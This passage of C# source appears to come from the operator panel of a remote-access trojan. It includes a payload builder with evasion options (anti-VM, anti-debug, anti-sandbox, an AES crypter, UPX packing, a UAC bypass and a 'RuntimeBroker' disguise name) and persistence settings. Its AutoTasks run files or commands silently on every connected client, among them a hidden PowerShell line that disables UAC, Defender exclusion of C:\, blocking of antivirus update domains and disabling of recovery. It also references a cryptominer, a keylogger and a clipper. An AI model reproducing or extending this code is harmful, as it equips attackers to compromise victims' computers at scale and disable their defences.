                    @"<Copyright>[^<]*</Copyright>", $"<Copyright>{copyright}</Copyright>");
            }
            else
            {
                // Add Copyright after Company if it doesn't exist
                csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                    @"(<Company>[^<]*</Company>)", $"$1\n    <Copyright>{copyright}</Copyright>");
            }

            // Update ProductVersion and InformationalVersion
            if (csproj.Contains("<ProductVersion>"))
            {
                csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                    @"<ProductVersion>[^<]*</ProductVersion>", $"<ProductVersion>{productVersion}</ProductVersion>");
            }

            if (csproj.Contains("<InformationalVersion>"))
            {
                csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                    @"<InformationalVersion>[^<]*</InformationalVersion>", $"<InformationalVersion>{productVersion}</InformationalVersion>");
            }

            await File.WriteAllTextAsync(csprojPath, csproj);

            // Only wipe the previous bin output — the obj directory holds NativeAOT's ILC cache
            // (compiled objects in obj/Release/win-x64/native/) and must be preserved so that
            // incremental builds reuse already-compiled code instead of starting from zero each time.
            var binDir = Path.Combine(stubDir, "bin");
            await Task.Run(() => { try { if (Directory.Exists(binDir)) Directory.Delete(binDir, true); } catch { } });

            // Always NativeAOT — best evasion + modular native DLL plugins via NativeLibrary.Load
            TxtBuildStatus.Text = Lang.Get("BLD_STATUS_COMPILE");
            Log("[*] Builder: dotnet publish (NativeAOT)...");

            var tempOut = Path.Combine(Path.GetTempPath(), "sero_build_" + Guid.NewGuid().ToString("N")[..8]);

            var iconArg = "";
            var iconRaw = BldIconPath.Text;
            if (BldSetIcon.IsChecked == true && !iconRaw.Contains('"') && File.Exists(iconRaw))
            {
                iconArg = $" -p:ApplicationIcon=\"{iconRaw}\"";
            }

            // Size: optimize for smaller binary (fold identical methods, prefer size over speed).
            // Compatible with crypter/loader — they just compress+encrypt the PE, size reduction is fine.
            var ilcThreads = Math.Min(Environment.ProcessorCount, 8);
            var publishArgs = $"publish \"{csprojPath}\" -c Release -r win-x64 -p:PublishAot=true -p:InvariantGlobalization=true -p:IlcOptimizationPreference=Size -p:IlcGenerateStackTraceData=false -p:IlcFoldIdenticalMethodBodies=true -p:IlcMaxParallelism={ilcThreads}{iconArg} -o \"{tempOut}\"";
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = "dotnet",
                Arguments = publishArgs,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WorkingDirectory = stubDir,
            };

            // NativeAOT needs vswhere.exe in PATH to find MSVC linker
            {
                var vsInstaller = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                    "Microsoft Visual Studio", "Installer");
                if (Directory.Exists(vsInstaller))
                    psi.Environment["PATH"] = vsInstaller + ";" + Environment.GetEnvironmentVariable("PATH");
            }

            using var proc = System.Diagnostics.Process.Start(psi)!;

            // Only surface error/warning lines from the compiler — full output floods the log.
            static bool IsCompilerDiag(string line) =>
                line.Contains("error", StringComparison.OrdinalIgnoreCase) ||
                line.Contains("warning", StringComparison.OrdinalIgnoreCase) ||
                line.Contains("FAILED", StringComparison.OrdinalIgnoreCase);
            proc.OutputDataReceived += (_, e) =>
            {
                if (e.Data is { Length: > 0 } d && IsCompilerDiag(d))
                    Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background,
                        new Action(() => Log("[!] " + d)));
            };
            proc.ErrorDataReceived += (_, e) =>
            {
                if (e.Data is { Length: > 0 } d && IsCompilerDiag(d))
                    Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background,
                        new Action(() => Log("[!] " + d)));
            };
            proc.BeginOutputReadLine();
            proc.BeginErrorReadLine();

            // NativeAOT legitimately takes 5–15 min on first build; kill if it exceeds 20.
            using var buildCts = new System.Threading.CancellationTokenSource(TimeSpan.FromMinutes(20));
            try
            {
                await proc.WaitForExitAsync(buildCts.Token);
            }
            catch (OperationCanceledException)
            {
                try { proc.Kill(entireProcessTree: true); } catch { }
                Log("[!] Builder: NativeAOT compile timed out (>20 min) — process killed.");
                TxtBuildStatus.Text = Lang.Get("BLD_STATUS_TIMEOUT");
                return;
            }

            if (proc.ExitCode != 0)
            {
                Log($"[!] Builder: Build failed (exit {proc.ExitCode})");
                TxtBuildStatus.Text = Lang.Get("BLD_STATUS_FAILED");
                NotificationService.NotifyBuildError();
                return;
            }

            Log("[+] Builder: Compilation successful.");

            var builtExe = Path.Combine(tempOut, assemblyName + ".exe");
            if (!File.Exists(builtExe))
            {
                var exes = Directory.GetFiles(tempOut, "*.exe");
                if (exes.Length > 0) builtExe = exes[0];
                else
                {
                    Log("[!] Builder: Output exe not found.");
                    TxtBuildStatus.Text = Lang.Get("BLD_STATUS_NO_OUTPUT");
                    return;
                }
            }

            File.Copy(builtExe, outputExe, true);
            try { Directory.Delete(tempOut, true); } catch { }

            // Apply crypter if enabled — or if UAC bypass is checked (bypass lives inside the C++ loader)
            bool uacBypass = BldUacBypass.IsChecked == true;
            bool needsCrypter = BldEncrypt.IsChecked == true || uacBypass;
            if (needsCrypter)
            {
                if (uacBypass && BldEncrypt.IsChecked != true)
                    Log("[*] Builder: UAC bypass requires the native loader — crypter applied automatically.");

                TxtBuildStatus.Text = Lang.Get("BLD_STATUS_CRYPTER");
                Log("[*] Builder: Applying AES crypter...");

                // Pass icon + metadata so the C++ loader is compiled with them via rc.exe
                string? iconForLoader = (BldSetIcon.IsChecked == true && File.Exists(BldIconPath.Text))
                    ? BldIconPath.Text : null;
                var meta = (BldSetAssembly.IsChecked == true && selectedExePath != null && File.Exists(selectedExePath))
                    ? new SeroServer.Builder.LoaderMetadata(product, company, fileVersion, productVersion, assemblyTitle, copyright)
                    : null;

                await SeroServer.Builder.CrypterBuilder.ApplyAsync(outputExe, Log, iconForLoader, meta, uacBypass);
            }
            else
            {
                // No crypter — icon already embedded via -p:ApplicationIcon at compile time
            }

            if (BldUpx.IsChecked == true)
            {
                TxtBuildStatus.Text = Lang.Get("BLD_STATUS_UPX");
                Log("[*] Builder: Running UPX...");
                string upxExe = "upx";
                var toolsUpx = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "tools", "upx.exe");
                if (File.Exists(toolsUpx)) upxExe = toolsUpx;
                var upxPsi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = upxExe,
                    Arguments = $"--best --lzma \"{outputExe}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                };
                try
                {
                    using var upxProc = System.Diagnostics.Process.Start(upxPsi)!;
                    var upxOut = await upxProc.StandardOutput.ReadToEndAsync();
                    var upxErr = await upxProc.StandardError.ReadToEndAsync();
                    await upxProc.WaitForExitAsync();
                    if (upxProc.ExitCode == 0)
                        Log("[+] Builder: UPX compression applied.");
                    else
                        Log($"[!] Builder: UPX failed (exit {upxProc.ExitCode}) — skipped. Put upx.exe in PATH or tools/.");
                }
                catch
                {
                    Log("[!] Builder: UPX not found — skipped. Put upx.exe in PATH or tools/.");
                }
            }

            var size = new FileInfo(outputExe).Length;
            var sizeStr = size < 1024 * 1024
                ? $"{size / 1024.0:F0} KB"
                : $"{size / (1024.0 * 1024.0):F1} MB";
            Log($"[+] Builder: {Path.GetFileName(outputExe)} ({size:N0} bytes) saved.");
            TxtBuildStatus.Text = $"Built: {Path.GetFileName(outputExe)} ({sizeStr})";
            SetStatus("Build successful.");
            NotificationService.NotifyBuildSuccess();

            ShowBuildResult(Path.GetFileName(outputExe), sizeStr);
        }
        catch (Exception ex)
        {
            Log($"[!] Builder: {ex.Message}");
            TxtBuildStatus.Text = $"Error: {ex.Message}";
        }
        finally
        {
            BtnBuild.IsEnabled = true;
            BuilderPanel.IsEnabled = true;
        }
    }

    private void ShowBuildResult(string fileName, string sizeStr)
    {
        var bg  = (System.Windows.Media.SolidColorBrush)FindResource("WindowBgBrush");
        var sec = (System.Windows.Media.SolidColorBrush)FindResource("SectionBgBrush");
        var brd = (System.Windows.Media.SolidColorBrush)FindResource("InputBorderBrush");
        var txt = (System.Windows.Media.SolidColorBrush)FindResource("ContentTextBrush");
        var lbl = (System.Windows.Media.SolidColorBrush)FindResource("LabelBrush");
        var acc = (System.Windows.Media.SolidColorBrush)FindResource("AccentBrush");

        var dlg = new Window
        {
            Title = Lang.Get("BLD_SUCCESS_TITLE"),
            Width = 360, Height = 220,
            WindowStartupLocation = WindowStartupLocation.CenterOwner,
            Owner = this,
            ResizeMode = ResizeMode.NoResize,
            ShowInTaskbar = false,
            Background = bg,
            WindowStyle = WindowStyle.ToolWindow,
        };

        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(24, 20, 24, 20) };

        sp.Children.Add(new System.Windows.Controls.TextBlock
        {
            Text = "✔  " + Lang.Get("BLD_SUCCESS_MSG"),
            Foreground = acc, FontSize = 13, FontWeight = FontWeights.SemiBold,
            Margin = new Thickness(0, 0, 0, 12),
        });
        sp.Children.Add(new System.Windows.Controls.TextBlock
        {
            Text = $"{Lang.Get("BLD_FILE")} {fileName}",
            Foreground = txt, FontSize = 12,
            Margin = new Thickness(0, 0, 0, 4),
        });
        sp.Children.Add(new System.Windows.Controls.TextBlock
        {
            Text = $"{Lang.Get("BLD_SIZE")} {sizeStr}",
            Foreground = lbl, FontSize = 11,
            Margin = new Thickness(0, 0, 0, 20),
        });

        var btn = new System.Windows.Controls.Button
        {
            Content = "OK", Width = 80, Height = 28,
            HorizontalAlignment = HorizontalAlignment.Right,
            Background = sec, Foreground = txt, BorderBrush = brd,
            BorderThickness = new Thickness(1),
            Cursor = System.Windows.Input.Cursors.Hand,
        };
        btn.Click += (_, _) => dlg.Close();
        sp.Children.Add(btn);

        dlg.Content = sp;
        dlg.ShowDialog();
    }

    // Helper: run a process and return (exitCode, stdout+stderr combined) without deadlocking
    private static async Task<(int code, string output)> RunProcessAsync(System.Diagnostics.ProcessStartInfo psi)
    {
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        using var p = System.Diagnostics.Process.Start(psi)!;
        var outTask = p.StandardOutput.ReadToEndAsync();
        var errTask = p.StandardError.ReadToEndAsync();
        await p.WaitForExitAsync();
        return (p.ExitCode, await outTask + await errTask);
    }



    private void BuildConfig_Click(object sender, RoutedEventArgs e)
    {
        int.TryParse(BldPort.Text, out int port);
        int.TryParse(BldReconnectDelay.Text, out int reconnect);
        if (port < 1 || port > 65535) port = 7777;

        // Determine assembly name
        string name = "RuntimeBroker";

        var configDict = new Dictionary<string, object>
        {
            { "host", GetPrimaryHost() },
            { "port", port },
            { "assemblyName", name },
            { "useMutex", BldUseMutex.IsChecked == true },
            { "antiDebug", BldAntiDebug.IsChecked == true },
            { "antiVM", BldAntiVM.IsChecked == true },
            { "antiDetect", BldAntiDetect.IsChecked == true },
            { "antiSandbox", BldAntiSandbox.IsChecked == true },
            { "persistRegistry", BldPersistRegistry.IsChecked == true },
            { "persistStartup", BldPersistStartup.IsChecked == true },
            { "reconnectDelayMs", reconnect > 0 ? reconnect : 5000 },
        };

        // Only add mutexName if "Use Mutex" is checked
        if (BldUseMutex.IsChecked == true)
        {
            configDict["mutexName"] = BldMutex.Text.Trim();
        }

        var dialog = new Microsoft.Win32.SaveFileDialog
        {
            Filter = "JSON Config (*.json)|*.json",
            FileName = "config.json",
            Title = "Export Client Config"
        };

        if (dialog.ShowDialog() == true)
        {
            var json = JsonSerializer.Serialize(configDict, new JsonSerializerOptions { WriteIndented = true });
            File.WriteAllText(dialog.FileName, json);
            Log($"[+] Builder: Config exported to {dialog.FileName}");
            SetStatus("Config exported.");
        }
    }

    // ── Settings ────────────────────────────────────

    private async void GetMyIP_Click(object sender, RoutedEventArgs e)
    {
        try
        {
            TxtPortResult.Text = Lang.Get("PORT_GETTING_IP");
            using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(5) };
            var ip = (await http.GetStringAsync("https://api.ipify.org")).Trim();
            SettingsCheckIP.Text = ip;
            TxtPortResult.Text = $"Your public IP: {ip}";
            TxtPortResult.Foreground = (Brush)FindResource("DimBrush");
        }
        catch { TxtPortResult.Text = Lang.Get("PORT_FAILED_IP"); }
    }

    private async void CheckPort_Click(object sender, RoutedEventArgs e)
    {
        var ip = SettingsCheckIP.Text.Trim();
        if (!int.TryParse(SettingsCheckPort.Text.Trim(), out int port) || port < 1 || port > 65535)
        {
            TxtPortResult.Text = Lang.Get("PORT_INVALID");
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
            return;
        }

        if (ip is "127.0.0.1" or "localhost" or "::1" or "0.0.0.0" or "")
        {
            TxtPortResult.Text = Lang.Get("PORT_NO_LOCALHOST");
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
            return;
        }

        TxtPortResult.Text = $"Checking {ip}:{port}...";
        TxtPortResult.Foreground = (Brush)FindResource("DimBrush");

        try
        {
            using var tcp = new System.Net.Sockets.TcpClient();
            var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
            await tcp.ConnectAsync(ip, port, cts.Token);

            TxtPortResult.Text = $"Port {port} is OPEN on {ip}";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0x1b, 0x8a, 0x2e));
        }
        catch (OperationCanceledException)
        {
            TxtPortResult.Text = $"Port {port} is CLOSED or unreachable on {ip} (timeout)";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
        }
        catch
        {
            TxtPortResult.Text = $"Port {port} is CLOSED on {ip} (connection refused)";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
        }
    }

    private void SettingsApplyMaxClients_Click(object sender, RoutedEventArgs e)
    {
        if (int.TryParse(SettingsMaxClients.Text, out int max) && max > 0)
        {
            if (_server != null)
                _server.MaxConnectedClients = max;
            Log($"[*] Max connected clients set to {max}.");
            SetStatus($"Settings applied (max clients: {max}).");
            SaveConfig();
        }
        else
        {
            Log("[!] Invalid max clients value.");
        }
    }

    private void SettingsApplyDiscordRPC_Click(object sender, RoutedEventArgs e)
    {
        if (SettingsDiscordRPC.IsChecked == true && _discordRpc == null && _server is { IsRunning: true })
        {
            try
            {
                _discordRpc = new Net.SeroDiscordRPC();
                _discordRpc.Start(() => _server?.ConnectedClients.Count ?? 0);
                Log("[*] Discord RPC enabled.");
                SaveConfig();
            }
            catch { }
        }
        else if (SettingsDiscordRPC.IsChecked == false && _discordRpc != null)
        {
            _discordRpc.Stop();
            _discordRpc = null;
            Log("[*] Discord RPC disabled. Restart Discord or wait a few seconds for it to clear.");
            SaveConfig();
        }
    }

    [System.Runtime.InteropServices.DllImport("user32.dll")]
    private static extern bool SetWindowDisplayAffinity(nint hwnd, uint affinity);

    private void SettingsBlockCapture_Changed(object sender, RoutedEventArgs e)
    {
        // WDA_EXCLUDEFROMCAPTURE (0x11) hides from OBS/screenshots/RDP on Win10 2004+.
        // Falls back to WDA_MONITOR (0x1) on older builds (content shows as black).
        uint affinity = SettingsBlockCapture.IsChecked == true ? 0x11u : 0x0u;
        var hwnd = new System.Windows.Interop.WindowInteropHelper(this).Handle;
        if (!SetWindowDisplayAffinity(hwnd, affinity) && affinity != 0)
            SetWindowDisplayAffinity(hwnd, 0x1u);
        SaveConfig();
    }

    private void SettingsHideLogo_Changed(object sender, RoutedEventArgs e)
    {
        BgLogoImage.Visibility = SettingsHideLogo.IsChecked == true
            ? Visibility.Collapsed
            : Visibility.Visible;
        SaveConfig();
    }

    private void SettingsShowSeconds_Changed(object sender, RoutedEventArgs e)
    {
        UiPrefs.Set("ShowSeconds", SettingsShowSeconds.IsChecked == true ? 1 : 0);
        SaveConfig();
    }

    private void LoadSoundPreferences()
    {
        SndChk_Intro.IsChecked = UiPrefs.GetInt("SndEnabled_Intro", 1) == 1;
        SndChk_Startup.IsChecked = UiPrefs.GetInt("SndEnabled_Startup", 1) == 1;
        SndChk_Shutdown.IsChecked = UiPrefs.GetInt("SndEnabled_Shutdown", 1) == 1;
        SndChk_Connected.IsChecked = UiPrefs.GetInt("SndEnabled_Connected", 1) == 1;
        SndChk_NewClient.IsChecked = UiPrefs.GetInt("SndEnabled_NewClient", 1) == 1;
        SndChk_Disconnected.IsChecked = UiPrefs.GetInt("SndEnabled_Disconnected", 1) == 1;
        SndChk_BuildSuccess.IsChecked = UiPrefs.GetInt("SndEnabled_BuildSuccess", 1) == 1;
        SndChk_BuildError.IsChecked = UiPrefs.GetInt("SndEnabled_BuildError", 1) == 1;
        SndChk_Clipper.IsChecked = UiPrefs.GetInt("SndEnabled_Clipper", 1) == 1;
        SndChk_Keylogger.IsChecked = UiPrefs.GetInt("SndEnabled_Keylogger", 1) == 1;
        SndChk_AutoTask.IsChecked = UiPrefs.GetInt("SndEnabled_AutoTask", 1) == 1;
        SndChk_Download.IsChecked = UiPrefs.GetInt("SndEnabled_Download", 1) == 1;
        SndChk_Upload.IsChecked = UiPrefs.GetInt("SndEnabled_Upload", 1) == 1;
        SndChk_FileDelete.IsChecked = UiPrefs.GetInt("SndEnabled_FileDelete", 1) == 1;
    }

    private void SoundSetting_Changed(object sender, RoutedEventArgs e)
    {
        if (sender is System.Windows.Controls.CheckBox chk)
        {
            string name = chk.Name;
            if (name.StartsWith("SndChk_"))
            {
                string key = name.Substring(7);
                UiPrefs.Set("SndEnabled_" + key, chk.IsChecked == true ? 1 : 0);
            }
        }
    }

    private void PreviewSound_Click(object sender, RoutedEventArgs e)
    {
        if (sender is System.Windows.Controls.Button btn && btn.Tag is string fileName)
        {
            NotificationService.PlayPreviewFile(fileName);
        }
    }

    private void SettingsNotify_Changed(object sender, RoutedEventArgs e)
    {
        NotificationService.SetEnabled(SettingsNotifySound.IsChecked == true, SettingsNotifyVisual.IsChecked == true);
        SaveConfig();
    }

    private void ClearLogs_Click(object sender, RoutedEventArgs e)
    {
        if (TxtLogs == null) return;
        TxtLogs.Document.Blocks.Clear();
        _logPara = null;
        _logLineCount = 0;
        Log("[*] Logs cleared.");
    }

    private void SettingsDevLogs_Changed(object sender, RoutedEventArgs e)
    {
        bool on = SettingsDevLogs.IsChecked == true;
        DiagnosticLogger.Enabled = on;
        if (on) DiagnosticLogger.Info("Diagnostic logging re-enabled by user.");
        SaveConfig();
    }

    private void OpenDiagLogsFolder_Click(object sender, RoutedEventArgs e)
    {
        try { System.Diagnostics.Process.Start("explorer.exe", DiagnosticLogger.LogDirectory); }
        catch { }
    }

    // ── AutoTask ────────────────────────────────────

    private static bool ConfirmAutoTask(string action, string detail)
    {
        var result = MessageBox.Show(
            $"You are about to add the following AutoTask:\n\n" +
            $"  {action}\n\n" +
            $"{detail}\n\n" +
            "This will execute on all current and future clients (once per HWID).\n" +
            "Are you sure you want to continue?",
            "Confirm AutoTask",
            MessageBoxButton.YesNo,
            MessageBoxImage.Warning);
        return result == MessageBoxResult.Yes;
    }

    private async void AutoTask_AddFile_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.OpenFileDialog
        {
            Title = "Select file to auto-execute on clients",
            Filter = "All files (*.*)|*.*|Executables (*.exe)|*.exe"
        };
        if (dlg.ShowDialog() != true) return;

        var fileName = Path.GetFileName(dlg.FileName);
        if (!ConfirmAutoTask($"Add File: {fileName}",
            "The file will be uploaded to the server and silently executed on every new client."))
            return;

        try
        {
            var fileBytes = await File.ReadAllBytesAsync(dlg.FileName);
            var entry = new Data.AutoTaskEntry
            {
                FileName = fileName,
                FileBase64 = Convert.ToBase64String(fileBytes),
                FileSize = fileBytes.Length
            };
            _autoTasks.Add(entry);
            Log($"[+] AutoTask: added {entry.FileName} ({entry.SizeDisplay})");
            _ = ExecuteAutoTasksForAllConnected();
        }
        catch (Exception ex)
        {
            Log($"[!] AutoTask: failed to read {fileName}: {ex.Message}");
        }
    }

    private void AutoTask_BlockReset_Click(object sender, RoutedEventArgs e)
    {
        const string displayName = "Block Reset";
        if (_autoTasks.Any(t => t.FileName == displayName)) { Log("[!] AutoTask: Block Reset already in list."); return; }
        if (!ConfirmAutoTask("Block Reset",
            "Disables Windows Recovery Environment (WinRE) via reagentc /disable.\nPrevents the user from resetting or booting into recovery mode."))
            return;
        _ = CompileAndAddPluginTask(displayName, Builder.PluginSources.BlockReset, "user32.lib", adminOnly: true);
    }

    private void AutoTask_ExcludeCDrive_Click(object sender, RoutedEventArgs e)
    {
        const string displayName = "Exclude C:\\";
        if (_autoTasks.Any(t => t.FileName == displayName)) { Log("[!] AutoTask: Exclude C:\\ already in list."); return; }
        if (!ConfirmAutoTask("Exclude C:\\",
            "Adds C:\\ to Windows Defender's exclusion list via WMI (SYSTEM/Admin required).\nDefender will no longer scan files on the C drive."))
            return;
        _ = CompileAndAddPluginTask(displayName, Builder.PluginSources.ExcludeDefender, "ole32.lib oleaut32.lib advapi32.lib", adminOnly: true);
    }

    private void AutoTask_Custom_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new CustomAutoTaskDialog { Owner = this };
        ApplySoftwareRendering(dlg);
        if (dlg.ShowDialog() != true) return;

        if (!ConfirmAutoTask($"Custom: {dlg.TaskName}",
            $"Command: {dlg.TaskCommand}\n\nThis command will be executed silently on every new client."))
            return;

        var entry = new Data.AutoTaskEntry
        {
            Type = Data.AutoTaskType.ShellCommand,
            FileName = dlg.TaskName,
            ShellCommand = dlg.TaskCommand
        };
        _autoTasks.Add(entry);
        Log($"[+] AutoTask: custom task '{entry.FileName}' added.");
        _ = ExecuteAutoTasksForAllConnected();
    }

    private static string PluginCachePath(string pluginName)
    {
        var safe = pluginName.ToLowerInvariant()
            .Replace(" ", "_").Replace("\\", "").Replace(":", "").Replace("/", "_");
        return System.IO.Path.Combine(
            AppDomain.CurrentDomain.BaseDirectory, "plugin_cache", safe + ".dll");
    }

    // SHA256 of the C++ source — detects when plugin code changes after server recompile.
    private static string _SourceHash(string src)
    {
        var hash = System.Security.Cryptography.SHA256.HashData(
            System.Text.Encoding.UTF8.GetBytes(src));
        return Convert.ToHexString(hash)[..16]; // 16-char prefix is enough for cache key
    }

    private async Task CompileAndAddPluginTask(string taskName, string cppSource, string? extraLibs, bool adminOnly = false)
    {
        var cachePath = PluginCachePath(taskName);
        var hashPath  = cachePath + ".hash";
        byte[]? bytes = null;

        // Use cache only if the source hash matches — recompiles automatically when
        // plugin code changes (e.g. after a server recompile with updated sources).
        var currentHash = _SourceHash(cppSource);
        bool cacheValid = File.Exists(cachePath)
                       && File.Exists(hashPath)
                       && (await File.ReadAllTextAsync(hashPath)).Trim() == currentHash;

        if (cacheValid)
        {
            bytes = await File.ReadAllBytesAsync(cachePath);
        }
        else
        {
            Log($"[*] AutoTask: Compiling {taskName} plugin...");

            // Thread-safe log: CompilePluginDllAsync runs on the thread pool (to avoid blocking
            // the UI thread in GetVsEnvironment/FindClExe), so we marshal log calls back to UI.
            Action<string> safeLog = msg => Dispatcher.BeginInvoke(() => Log(msg));
            bytes = await Task.Run(() => Builder.CrypterBuilder.CompilePluginDllAsync(cppSource, extraLibs, safeLog));
            if (bytes == null)
            {
                Log($"[!] AutoTask: {taskName} compile failed — task not added.");
                return;
            }
            try
            {
                Directory.CreateDirectory(System.IO.Path.GetDirectoryName(cachePath)!);
                await File.WriteAllBytesAsync(cachePath, bytes);
                await File.WriteAllTextAsync(hashPath, currentHash);
            }
            catch { }
        }

        var entry = new Data.AutoTaskEntry
        {
            Type = Data.AutoTaskType.PluginExec,
            FileName = taskName,
            FileBase64 = Convert.ToBase64String(bytes),
            FileSize = bytes.Length,
            AdminOnly = adminOnly
        };
        _autoTasks.Add(entry);
        Log($"[+] AutoTask: {taskName} added as DLL plugin ({entry.SizeDisplay}).");
        _ = ExecuteAutoTasksForAllConnected();
    }

    private void AutoTask_DisableUAC_Click(object sender, RoutedEventArgs e)
    {
        if (_autoTasks.Any(t => t.FileName == "Disable UAC")) { Log("[!] AutoTask: Disable UAC already in list."); return; }
        if (!ConfirmAutoTask("Disable UAC",
            "Sets EnableLUA=0 and disables all UAC prompts via registry (Admin required).\nTakes effect after the client reboots — future processes run elevated without any UAC popup."))
            return;

        var entry = new Data.AutoTaskEntry
        {
            Type = Data.AutoTaskType.ShellCommand,
            FileName = "Disable UAC",
            ShellCommand = "powershell -NoP -NonI -W Hidden -Command \"" +
                "$p='HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System';" +
                "Set-ItemProperty $p EnableLUA                   0 -Type DWord -Force;" +
                "Set-ItemProperty $p ConsentPromptBehaviorAdmin  0 -Type DWord -Force;" +
                "Set-ItemProperty $p ConsentPromptBehaviorUser   0 -Type DWord -Force;" +
                "Set-ItemProperty $p PromptOnSecureDesktop       0 -Type DWord -Force\"",
            AdminOnly = true
        };
        _autoTasks.Add(entry);
        Log("[+] AutoTask: Disable UAC added (EnableLUA=0, no reboot forced).");
        _ = ExecuteAutoTasksForAllConnected();
    }


    private void AutoTask_BlockAvDomains_Click(object sender, RoutedEventArgs e)
    {
        const string displayName = "Block AV DNS";
        if (_autoTasks.Any(t => t.FileName == displayName)) { Log("[!] AutoTask: Block AV DNS already in list."); return; }
        if (!ConfirmAutoTask("Block AV DNS",
            "Blocks update/telemetry domains of common AV products (Defender, Kaspersky, ESET, Bitdefender…) via the hosts file.\nPrevents antivirus signature updates and cloud lookups."))
            return;
        _ = CompileAndAddPluginTask(displayName, Builder.PluginSources.BlockAvDns, "user32.lib", adminOnly: true);
    }

    private void AutoTask_BotKiller_Click(object sender, RoutedEventArgs e)
    {
        const string displayName = "BotKiller";
        if (_autoTasks.Any(t => t.FileName == displayName)) { Log("[!] AutoTask: BotKiller already in list."); return; }
        if (!ConfirmAutoTask("BotKiller",
            "Scans for and terminates unsigned processes with random-looking names (common RAT/miner pattern).\nAlso removes their persistence from Run registry keys and the Startup folder."))
            return;
        _ = CompileAndAddPluginTask(displayName, Builder.PluginSources.BotKiller, "advapi32.lib", adminOnly: false);
    }

    private async void BldMnrDownloadXmrig_Click(object sender, RoutedEventArgs e)
    {
        string fallback = "https://github.com/xmrig/xmrig/releases/latest";
        string url = fallback;
        try
        {
            using var http = new System.Net.Http.HttpClient();
            http.DefaultRequestHeaders.Add("User-Agent", "SeroC2-Builder");
            http.Timeout = TimeSpan.FromSeconds(6);
            var json = await http.GetStringAsync("https://api.github.com/repos/xmrig/xmrig/releases/latest");
            using var doc = System.Text.Json.JsonDocument.Parse(json);
            if (doc.RootElement.TryGetProperty("assets", out var assets))
            {
                foreach (var asset in assets.EnumerateArray())
                {
                    if (asset.TryGetProperty("name", out var nameProp) &&
                        nameProp.GetString() is string n &&
                        n.Contains("windows-x64", StringComparison.OrdinalIgnoreCase) && n.EndsWith(".zip") &&
                        asset.TryGetProperty("browser_download_url", out var dlProp) &&
                        dlProp.GetString() is string dl)
                    {
                        url = dl;
                        break;
                    }
                }
            }
        }
        catch { }
        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo { FileName = url, UseShellExecute = true });
    }

    private string _mnrStatsToken = "";

    private string EnsureMinerToken()
    {
        if (!string.IsNullOrEmpty(_mnrStatsToken)) return _mnrStatsToken;
        _mnrStatsToken = Convert.ToHexString(
            System.Security.Cryptography.RandomNumberGenerator.GetBytes(16)).ToLower();
        return _mnrStatsToken;
    }

    private void BtnDashMinerStats_Click(object sender, RoutedEventArgs e)
    {
        var win = new MinerStatsWindow(
            _minerStatsHost,
            MinerStatsPort,
            EnsureMinerToken(),
            host => _minerStatsHost = host)
        { Owner = this };
        win.Show();
    }

    // ── BotKiller: send to selected clients on-demand (right-click menu) ──
    private async void BotKiller_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var bytes = await Builder.CrypterBuilder.CompilePluginDllAsync(
            Builder.PluginSources.BotKiller, "advapi32.lib", Log);
        if (bytes == null) { Log("[!] BotKiller: compile failed."); return; }

        var packet = new Protocol.Packet
        {
            Type = Protocol.PacketType.PluginExec,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
            {
                DllBase64  = Convert.ToBase64String(bytes),
                ExportName = "PluginMain"
            })
        };
        await Task.WhenAll(clients.Select(async c =>
        {
            try { await _server.SendToClient(c.Id, packet); } catch { }
        }));
        Log($"[+] BotKiller sent to {clients.Count} client(s) ({bytes.Length / 1024.0:F0} KB).");
    }

    private void AutoTask_Remove_Click(object sender, RoutedEventArgs e)
    {
        var selected = GridAutoTasks.SelectedItems.Cast<Data.AutoTaskEntry>().ToList();
        if (selected.Count == 0) return;
        string msg = selected.Count == 1
            ? $"Remove auto-task '{selected[0].FileName}'?\nThis cannot be undone."
            : $"Remove {selected.Count} auto-tasks?\nThis cannot be undone.";
        if (MessageBox.Show(msg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        foreach (var task in selected)
        {
            _autoTasks.Remove(task);
            Log($"[-] AutoTask: removed {task.FileName}");
        }
    }

    private void AutoTask_Refresh_Click(object sender, RoutedEventArgs e)
    {
        LoadConfig();
        SetStatus("AutoTasks reloaded from config.");
    }

    private Task ExecuteAutoTasksForAllConnected()
    {
        if (_server == null || _autoTasks.Count == 0) return Task.CompletedTask;
        var clients = _server.ConnectedClients.Values.ToList();
        if (clients.Count == 0) return Task.CompletedTask;
        var snapshot = _autoTasks.ToList(); // capture on UI thread — safe
        // Parallel with cap — avoids blocking the caller for N×200ms at 10k+ clients
        return Task.Run(() => Parallel.ForEachAsync(clients, new ParallelOptions { MaxDegreeOfParallelism = 50 },
            async (client, _) =>
            {
                try { await ExecuteAutoTasksForClient(client, snapshot); }
